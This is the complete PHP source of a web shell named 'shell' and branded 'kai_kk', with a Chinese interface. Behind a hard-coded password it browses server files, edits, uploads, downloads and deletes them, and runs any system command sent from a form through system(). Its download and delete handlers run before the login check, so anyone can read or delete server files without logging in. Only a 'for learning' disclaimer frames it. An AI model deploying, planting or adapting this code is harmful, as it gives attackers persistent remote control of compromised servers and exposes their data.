<?php
session_start();
$password = 'admin@123'; // 登录密码

/*========== 认证模块 ==========*/
function authenticate() {
    global $password;
    if (isset($_POST['login'])) {
        if ($_POST['password'] === $password) {
            $_SESSION['auth'] = true;
        }
    }
    if (isset($_GET['logout'])) {
        session_destroy();
        header("Location: ?");
        exit;
    }
    if (empty($_SESSION['auth'])) {
        show_login();
        exit;
    }
}

/*========== 核心功能 ==========*/
// 文件下载处理
if (isset($_GET['download'])) {
    $file = realpath($_GET['download']);
    if ($file && is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        readfile($file);
        exit;
    }
}

// 文件删除处理
if (isset($_GET['delete'])) {
    $file = realpath($_GET['delete']);
    if ($file && is_file($file)) {
        if (unlink($file)) {
            echo '<div class="container"><div class="alert alert-success">文件删除成功！</div></div>';
        } else {
            echo '<div class="container"><div class="alert alert-danger">文件删除失败！请检查权限</div></div>';
        }
    } else {
        echo '<div class="container"><div class="alert alert-warning">文件不存在或路径非法！</div></div>';
    }
}

// 文件编辑器功能（新增函数）
function show_editor($filePath) {
    $file = realpath($filePath);
    if (!$file || !is_file($file)) {
        echo '<div class="container"><div class="alert alert-danger">文件不存在！</div></div>';
        return;
    }

    // 处理保存请求
    $content = file_get_contents($file);
    if (isset($_POST['save'])) {
        $newContent = $_POST['content'];
        if (is_writable($file)) {
            if (file_put_contents($file, $newContent) !== false) {
                echo '<div class="container"><div class="alert alert-success">✔️ 文件保存成功</div></div>';
                $content = $newContent; // 更新显示内容
            } else {
                echo '<div class="container"><div class="alert alert-danger">❌ 文件保存失败！请检查磁盘空间</div></div>';
            }
        } else {
            echo '<div class="container"><div class="alert alert-danger">❌ 文件不可写！请检查权限</div></div>';
        }
    }

    // 显示编辑器界面
    echo <<<HTML
<div class="container mt-4">
    <div class="card shadow-sm">
        <div class="card-header">
            📝 编辑文件: <code>{$file}</code>
            <a href="?" class="btn btn-sm btn-secondary float-end">返回</a>
        </div>
        <div class="card-body">
            <form method="post">
                <div class="mb-3">
                    <textarea 
                        name="content" 
                        class="form-control font-monospace" 
                        rows="20"
                        style="font-size: 14px; tab-size: 4;"
                    >{$content}</textarea>
                </div>
                <button type="submit" name="save" class="btn btn-primary">
                    💾 保存更改
                </button>
            </form>
        </div>
    </div>
</div>
HTML;
}


// 命令执行处理（增强版）
function execute_command($cmd) {
    system($cmd);

}

function handle_file_upload($current_dir) {
    if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
        $target_dir = realpath($current_dir);
        $target_file = $target_dir . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);

        // 检查文件是否已存在
        if (file_exists($target_file)) {
            return '<div class="container"><div class="alert alert-warning">文件已存在！</div></div>';
        }

        // 尝试移动上传的文件
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
            return '<div class="container"><div class="alert alert-success">文件上传成功！</div></div>';
        } else {
            return '<div class="container"><div class="alert alert-danger">文件上传失败！</div></div>';
        }
    }
    return '';
}

/*========== 界面组件 ==========*/
function show_login() {
    echo <<<HTML
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>shell</title>
    <link href="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.1.3/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #f8f9fa; height: 100vh; }
        .login-box {
            max-width: 400px;
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body class="d-flex align-items-center">
    <div class="container">
        <div class="login-box bg-white mx-auto">
            <h2 class="text-center mb-4">🔐 kai_kk</h2>
            <form method="post">
                <div class="mb-3">
                    <input type="password" name="password" 
                           class="form-control form-control-lg" 
                           placeholder="输入密码" required>
                </div>
                <button name="login" class="btn btn-primary btn-lg w-100">
                    登录shell
                </button>
                <p class="text-center mt-3">仅供学习与交流，禁止用于非法用途。</p> 
            </form>
        </div>
    </div>
</body>
</html>
HTML;
}

function show_header() {
    echo <<<HTML
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>file manager</title>
    <link href="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.1.3/css/bootstrap.min.css" rel="stylesheet">
    <style>
        .file-icon { font-size: 1.2em; margin-right: 8px; }
        .action-btns .btn { margin: 2px; }
        pre { 
            background: #f8f9fa; 
            padding: 15px; 
            border-radius: 5px;
            max-height: 60vh;
            overflow: auto;
            white-space: pre-wrap;
        }
    </style>
</head>
<body class="bg-light">
<nav class="navbar navbar-dark bg-dark mb-4">
    <div class="container">
        <a class="navbar-brand" href="?">📁 kai_kk</a>
        <a href="?logout" class="btn btn-outline-light">退出系统</a>
    </div>
</nav>
HTML;
}

function show_file_manager($dir = '.') {
    $current_path = realpath($dir);
    $parent_dir = dirname($current_path);

    echo '<div class="container">';

    // 路径导航
    echo '<div class="mb-3">';
    echo '<a href="?path='.urlencode($parent_dir).'" class="btn btn-sm btn-outline-secondary">← 上级目录</a>';
    echo '<span class="ms-3 text-muted">当前位置：'.htmlspecialchars($current_path).'</span>';
    echo '</div>';

    // 文件表格
    echo '<div class="card shadow-sm">';
    echo '<div class="card-body p-0">';
    echo '<table class="table table-hover mb-0">';
    echo '<thead class="bg-light"><tr>
            <th>名称</th>
            <th>类型</th>
            <th>大小</th>
            <th>修改时间</th>
            <th width="200">操作</th>
          </tr></thead>';
    echo '<tbody>';

    foreach (scandir($current_path) as $file) {
        if ($file == '.' || $file == '..') continue;
        $full_path = $current_path.DIRECTORY_SEPARATOR.$file;
        $is_dir = is_dir($full_path);

        echo '<tr>';
        // 名称列
        echo '<td>';
        if($is_dir) {
            echo '<a href="?path='.urlencode($full_path).'" class="text-decoration-none">';
            echo '📁 ';
            echo htmlspecialchars($file);
            echo '</a>';
        } else {
            echo '📄 ';
            echo htmlspecialchars($file);
        }
        echo '</td>';

        // 类型列
        echo '<td>'.($is_dir ? '文件夹' : '文件').'</td>';

        // 大小列
        echo '<td>'.format_size($is_dir ? 0 : filesize($full_path)).'</td>';

        // 修改时间
        echo '<td>'.date("Y-m-d H:i", filemtime($full_path)).'</td>';

        // 操作列
        echo '<td class="action-btns">';
        if (!$is_dir) {
            echo '<a href="?edit='.urlencode($full_path).'" class="btn btn-sm btn-outline-primary">编辑</a>';
            echo '<a href="?download='.urlencode($full_path).'" class="btn btn-sm btn-outline-success">下载</a>';
            echo '<a href="?delete='.urlencode($full_path).'" 
                   onclick="return confirm(\'确认删除？\')" 
                   class="btn btn-sm btn-outline-danger">删除</a>';
        }
        echo '</td></tr>';
    }

    echo '</tbody></table></div></div>'; // 结束卡片和表格

    // 功能面板
    show_tools_panel($current_path);
}

function show_tools_panel($current_path) {
    echo '<div class="row mt-4">';

    // 上传面板
    echo '<div class="col-md-6 mb-4">';
    echo '<div class="card shadow-sm">';
    echo '<div class="card-header">📤 文件上传</div>';
    echo '<div class="card-body">';
    echo '<form method="post" enctype="multipart/form-data">';
    echo '<input type="file" name="file" class="form-control mb-3" required>';
    echo '<button class="btn btn-primary w-100">上传文件</button>';
    echo '</form>';
    echo '</div></div></div>';

    // 命令面板（增强版）
    echo '<div class="col-md-6 mb-4">';
    echo '<div class="card shadow-sm">';
    echo '<div class="card-header">💻 命令执行</div>';
    echo '<div class="card-body">';
    echo '<form method="post">';
    echo '<input type="text" name="cmd" 
           placeholder="输入系统命令" 
           class="form-control mb-3"
           value="'.htmlspecialchars($_POST['cmd'] ?? '').'">';
    echo '<button class="btn btn-warning w-100">执行命令</button>';
    echo '</form>';
    if (!empty($_POST['cmd'])) {
        echo '<div class="mt-3">'.execute_command($_POST['cmd']).'</div>';
    }
    echo '</div></div></div>';

    echo '</div>'; // 结束row
}

/*========== 工具函数 ==========*/
function format_size($size) {
    $units = ['B', 'KB', 'MB', 'GB'];
    for ($i = 0; $size >= 1024 && $i < 3; $i++) $size /= 1024;
    return round($size, 2).' '.$units[$i];
}

/*========== 主流程 ==========*/
authenticate();

show_header();

// 处理操作请求
$current_dir = isset($_GET['path']) ? $_GET['path'] : '.';

$upload_result = handle_file_upload($current_dir);
echo $upload_result;

// 显示内容
if (isset($_GET['edit'])) {
    show_editor($_GET['edit']);
} else {
    show_file_manager($current_dir);
}
echo '<p> 仅供学习，勿用于非法用途。</p>';

echo '</body></html>';